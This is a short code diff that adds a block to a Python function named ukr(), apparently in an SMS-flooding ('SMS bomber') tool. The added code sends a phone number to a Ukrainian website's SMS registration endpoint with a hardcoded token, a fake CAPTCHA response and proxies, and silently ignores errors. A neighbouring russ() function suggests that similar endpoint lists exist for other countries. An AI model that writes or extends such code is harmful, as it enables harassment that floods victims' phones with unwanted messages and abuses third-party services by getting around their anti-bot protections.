@@ -167,6 +167,12 @@ def ukr():
                         pass
                 except:
                         pass
+                try:
+                        formatted_phone = format_phone(number, "+###+##+###+##+##")
+                        requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, proxies=proxies)
+                        pass
+                except:
+                        pass
 
 
 def russ():
